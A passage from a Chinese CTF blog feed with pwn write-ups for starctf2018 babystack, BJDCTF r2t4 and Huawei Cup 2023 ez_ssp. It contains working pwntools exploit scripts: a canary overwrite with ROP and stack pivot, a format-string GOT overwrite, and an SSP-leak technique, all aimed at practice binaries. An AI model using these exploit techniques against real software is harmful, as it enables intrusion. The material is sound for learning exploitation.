class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack8.png" alt="【starctf2018】babystack8.png"></p><p>GDB 就自动调试到子线程中了，一直到 <code>sub_400906()</code> 让我们输入长度时，输入大一点，我这里输入 <code>0x3000</code></p><p>但是发现好像第二次在 <code>sub_400957(0, s, v2);</code> 中的输入被跳过了</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack9.png" alt="【starctf2018】babystack9.png"></p><p>由于我们也没办法输入回车符、换行符，因此用脚本来测试</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'aaaaaaaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入调试后，我们首先需要将调试的线程切换到子线程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> thread <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后正常调试发送 payload，查看栈中的布局：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack10.png" alt="【starctf2018】babystack10.png"></p><p>我们输入的数据在 <code>0x7f97df1fdee0</code> 地址处</p><p>GDB 获取子线程的 TLS 在栈上的首地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/x pthread_self<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于 Canary 在 TLS 中偏移 <code>0x28</code> 的位置：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack11.png" alt="【starctf2018】babystack11.png"></p><p>于是我们输入的位置距离 TLS 中 Canary 的位置：<code>(0x7f97df1ff700 + 0x28) - 0x7f97df1fdee0 = 0x1848</code> 字节</p><p>因此我们至少需要溢出 <code>0x1848 + 0x8 = 0x1850</code> 字节</p><p>虽然程序没有开 PIE，但也没有 <code>system()</code> 和 <code>b&#39;/bin/sh&#39;</code>，因此我们还是需要通过 libc 偏移进行计算，这里选择先使用 <code>puts_plt_addr</code> 输出 <code>puts_got_addr</code> 泄露 <code>puts()</code> 的真实地址</p><p>同时，这里只有一次机会</p><blockquote><p>反正我尝试让程序执行流回到 <code>start_routine()</code> 或者 <code>main()</code> 后，在第二次发送 payload 时都会导致程序崩溃</p></blockquote><p>因此，最后选择首先通过 <code>read()</code> 将 <code>system(&quot;/bin/sh&quot;)</code> 写到一个可写入的地方，我这里选择的是 BSS 段首地址的下一地址 <code>target_addr</code> 处</p><p>然后利用 <code>leave; ret</code> 指令实现栈迁移</p><p>其中 <code>leave</code> 指令将 EBP 迁移到 <code>target_addr - 8</code> 的地方（即：BSS 段的首地址处），由于出栈操作使 RSP + 8 让 RSP 指向 <code>target_addr</code> 的位置</p><p>然后通过 <code>ret</code> 指令执行我们写在 BSS 段上的 <code>system(&quot;/bin/sh&quot;)</code></p><blockquote><p><strong>其实只要保证 <code>read()</code> 写入的地方在 EBP 迁移过去的地址的下一地址处即可</strong></p><p>如果对栈迁移的流程不太清楚，可以查看本站《<a href="%E6%A0%88%E8%BF%81%E7%A7%BB.md">栈迁移</a>》一文的 <em>《可以覆盖到返回地址》</em> 部分</p></blockquote><p>但实际操作时发现，我们确实已经成功构造了 <code>system(&quot;/bin/sh&quot;)</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack12.png" alt="【starctf2018】babystack12.png"></p><p>但是会在 <code>do_system()</code> 中发生段错误，导致无法 getshell</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack13.png" alt="【starctf2018】babystack13.png"></p><p>暂时不知道错误发生的原因</p><p>但是通过 one_gadget 执行 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code> 是可以 getshell 的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack14.png" alt="【starctf2018】babystack14.png"></p><p>这几个都尝试了一下，发现 <code>one_gadget_libc = 0x4f322</code> 是可以的</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bs'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/opt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./bs"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">26929</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>bss_start <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bss_start -->"</span><span class="token punctuation">,</span> bss_start<span class="token punctuation">)</span>target_addr <span class="token operator">=</span> bss_start <span class="token operator">+</span> <span class="token number">0x8</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"target_addr -->"</span><span class="token punctuation">,</span> target_addr<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x400c03</span>pop_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x400c01</span>leave_ret <span class="token operator">=</span> <span class="token number">0x400955</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>puts_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>puts_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>read_plt_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>offset <span class="token operator">=</span> <span class="token number">0x1850</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"How many bytes do you want to send?\n"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 构造 payload 至少需要 0x1850 的长度</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1008</span>   <span class="token comment"># 填充 0x1008 个垃圾数据到达 Canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment"># 0xdeadbeef 是被我们修改后的 Canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>target_addr <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span>   <span class="token comment"># 当前 rbp 的位置，填写栈迁移的地址</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_plt_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x1848</span><span class="token punctuation">,</span> <span class="token string">b"a"</span><span class="token punctuation">)</span>   <span class="token comment"># 长度填充到 0x1848 到达 TLS 中 Canary 的位置</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>   <span class="token comment"># 修改 TLS 中的 stack_guard，也就是 Canary</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># payload 长度刚好 0x1850，因此不要用 sendline</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"It's time to say goodbye.\n"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"puts_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_libc <span class="token operator">=</span> <span class="token number">0x4f322</span>libcbase <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>one_gadget_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> one_gadget_libc   <span class="token comment"># 根据 libc 偏移计算 one_gadget 真实地址</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bin_sh_addr -->"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token comment"># payload = p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span>debug<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{4f062841-5776-44e5-b0fc-adab7593184b}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack7.png" alt="【starctf2018】babystack7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> Bypass </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【BJDCTF 2nd】r2t4</title>
      <link href="/posts/a0efa060.html"/>
      <url>/posts/a0efa060.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li>存在 Canary 保护，只能使用一次格式化字符串漏洞，但没有开 PIE，因此想到劫持 <code>__stack_chk_fail</code> 的 GOT 表地址为后门函数的地址</li></ul><hr><p><a href="https://buuoj.cn/challenges#[BJDCTF%202nd]r2t4">【BJDCTF 2nd】r2t4</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>查看保护机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%201.png" alt="【BJDCTF 2nd】r2t4 1.png"></p><p>尝试运行，明显存在溢出：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%202.png" alt="【BJDCTF 2nd】r2t4 2.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%203.png" alt="【BJDCTF 2nd】r2t4 3.png"></p><p>明显 <code>buf</code> 处存在溢出，且 <code>printf(buf)</code> 存在格式化字符串漏洞</p><p>存在一个后门函数 <code>backdoor()</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%204.png" alt="【BJDCTF 2nd】r2t4 4.png"></p><p>但这里 <code>buf</code> 溢出的长度有限，只能刚好覆盖返回地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%205.png" alt="【BJDCTF 2nd】r2t4 5.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%206.png" alt="【BJDCTF 2nd】r2t4 6.png"></p><p>考虑到 <code>Partial RELRO</code>，并且存在格式化字符串漏洞，且只能使用一次格式化字符串漏洞</p><p>因此尝试劫持 <code>__stack_chk_fail</code> 函数的 GOT 表地址为后门函数 <code>backdoor()</code> 的地址</p><p>由于是 64 位程序，根据栈的布局可知，输入的格式化字符串偏移为 6</p><blockquote><p>如果对格式化字符串漏洞不熟悉的话，可以看看本站《<a href="%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8.md">格式化字符串漏洞与利用</a>》一文</p></blockquote><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./r2t4"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.29.so"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./r2t4"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment"># 远程程序的 IP 和端口号</span>    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node5.buuoj.cn"</span><span class="token punctuation">,</span> <span class="token number">28170</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>backdoor_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"backdoor"</span><span class="token punctuation">]</span>__stack_chk_fail_got_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__stack_chk_fail"</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>__stack_chk_fail_got_addr<span class="token punctuation">:</span> backdoor_addr<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>flag{90b19213-0fe1-4802-a73f-7e4f38962e88}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90BJDCTF%202nd%E3%80%91r2t4%207.png" alt="【BJDCTF 2nd】r2t4 7.png"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Pwn </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【华为杯 2023】ez_ssp</title>
      <link href="/posts/12245599.html"/>
      <url>/posts/12245599.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>利用 glibc-all-in-one 和 patchelf 修改二进制文件的 libc 版本</mark></p></li><li><p><mark>GDB 进行多进程的调试方法</mark></p></li><li><p>利用 SSP Leak 绕过 Canary，修改 <code>__fortify_fail</code> 函数中要输出的变量 <code>__libc_argv[0]</code> 的地址，故意触发 Canary 保护实现任意地址读</p></li><li><p><mark>libc 中存在着一个 <code>environ</code> 函数，它是一个全局变量，储存着系统的环境变量，通过泄露 <code>environ</code> 的真实地址处的值可以得到栈上存储的环境变量的首地址</mark></p></li></ul><hr><p>今天整理笔记的时候找例题突然想起了去年华为杯有一道类似的题，不过链接早就不记得啦，需要原题二进制文件的去网上搜搜看有没有吧，或者邮箱找我要也可以</p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><blockquote><p>由于是本地复现，这个 SSP Leak 依赖于 Glibc 版本，详情可查看本站《<a href="Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md">Bypass安全机制</a>》一文的 <em>《SSP Leak 绕过 Canary》</em> 部分</p><p>因此，我们需要先使用 patchelf 更改题目的二进制程序使用的 libc 版本，具体操作详情可查看本站《<a href="Pwntools%E4%B8%8Eexp%E6%8A%80%E5%B7%A7.md">Pwntools与exp技巧</a>》一文的 <em>《glibc-all-in-one 和 patchelf》</em> 部分</p></blockquote><p>该题给出了 Glibc 版本为 2.23</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp1.png" alt="华为杯2023-ez_ssp1.png"></p><p>由于 SSP Leak 在 Ubuntu 22.04 本地是无法复现的，因为 Glibc 2.35 修复了这个问题（不过 Ubuntu 16.04 的 Glibc 2.23 可以）</p><p>首先通过 glibc-all-in-one 下载 <code>2.23-0ubuntu11.3_amd64</code> 版本的 libc，并通过 patchelf 替换：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp2.png" alt="华为杯2023-ez_ssp2.png"></p><p>安全机制：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp4.png" alt="华为杯2023-ez_ssp4.png"></p><p>在 IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp3.png" alt="华为杯2023-ez_ssp3.png"></p><p>程序会先打开本地的 flag 文件并读取内容，保存到 <code>s</code> 中，<code>s</code> 位于栈上</p><p><strong>由于我们本地没有 flag 文件，所以需要自己创建一个，否则程序运行会报错，我们也无法进行调试</strong></p><p>flag 内容随便写：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp5.png" alt="华为杯2023-ez_ssp5.png"></p><p>首先根据 <code>v3</code> 生成随机数 <code>v7</code>，然后将我们输入的 <code>buf</code> 与 <code>v7</code> 一起作为 <code>sub_400A65()</code> 的参数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp6.png" alt="华为杯2023-ez_ssp6.png"></p><p>可以看到这个函数也是用来生成随机数的，将随机数返回赋值给 <code>v9</code></p><p>然后将 flag 和 <code>v9</code> 一起执行 <code>sub_400AB0(s, v9, 50)</code>，根据前面读取 flag 的长度为 <code>0x32</code> 可以得知，这里的 <code>50</code> 是读取 flag 的长度</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp7.png" alt="华为杯2023-ez_ssp7.png"></p><p>这个函数将 flag 的每一位与随机数 <code>v9</code> 进行了异或，差不多可以理解为异或加密了一下</p><p>然后有一个 for 循环，可以循环 3 次，每次都会通过 <code>fork()</code> 函数生成一个子进程</p><blockquote><p>注意：<strong>子进程崩溃不会导致父进程退出</strong></p><p>因此我们相当于有 3 次覆盖 Canary 的机会，但是想修改返回地址依然是没有意义的，因为子进程会崩溃</p></blockquote><p>每轮循环有两次输入，第一个 <code>buf</code> 处明显没有溢出，但第二个 <code>gets(v12)</code> 存在明显溢出</p><p>栈中的情况：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp8.png" alt="华为杯2023-ez_ssp8.png"></p><p>静态信息获取差不多了，接下来就需要进行动态调试了</p><blockquote><p>注意，这里涉及到多进程，需要进行多进程的 GDB 动态调试，如果不熟悉的话，可以看看本站《<a href="GDB%E7%9A%84%E5%9F%BA%E7%A1%80%E5%92%8C%E4%BD%BF%E7%94%A8.md">GDB的基础和使用</a>》一文中的 <em>《fork 多进程调试》</em> 部分</p></blockquote><p>为了便于我们调试，我们首先将 GDB 设置如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> follow-fork-mode child   <span class="token comment"># fork 之后调试子进程，父进程不受影响</span><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token builtin class-name">set</span> detach-on-fork off   <span class="token comment"># 同时调试父进程和子进程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在 <code>gets()</code> 的 <code>0x400CAC</code> 处下断点：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp9.png" alt="华为杯2023-ez_ssp9.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp10.png" alt="华为杯2023-ez_ssp10.png"></p><p>第一个输入不存在溢出，我这里输入 <code>uf4te</code></p><p>第二个输入需要计算偏移，我这里输入 <code>aaaaaaaa</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp11.png" alt="华为杯2023-ez_ssp11.png"></p><p>根据触发 Canary 会输出文件名，RBP 下面那一串文件路径就是我们所说的 <code>__libc_argv[0]</code>，也可以在 GDB 中进行验证：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp12.png" alt="华为杯2023-ez_ssp12.png"></p><p>计算偏移得到第二次输入与 <code>__libc_argv[0]</code> 之间的距离，需要填充 <code>0x128</code> 个垃圾字符进行覆盖</p><p>虽然程序没有开 PIE，但是栈地址是随机的，因此我们还需要用到 libc 中的 <code>environ</code> 函数帮助我们计算栈偏移</p><blockquote><p>关于 <code>environ</code> 函数的详细介绍见本站的《<a href="Bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6.md">Bypass安全机制</a>》一文中 <em>《SSP Leak 绕过 Canary》</em> 部分</p></blockquote><p>因此，我们需要首先获取 <code>environ</code> 函数的真实地址，这里选择先泄露一个 <code>read()</code> 函数的真实地址，然后进行 libc 基地址的计算即可</p><p>将 <code>__libc_argv[0]</code> 覆盖为 <code>read_got_addr</code>，然后由于触发 Canary 会将 <code>read()</code> 函数的真实地址泄露出来</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp13.png" alt="华为杯2023-ez_ssp13.png"></p><p>计算得到 <code>environ</code> 函数的真实地址后，再将 <code>__libc_argv[0]</code> 覆盖为 <code>environ</code> 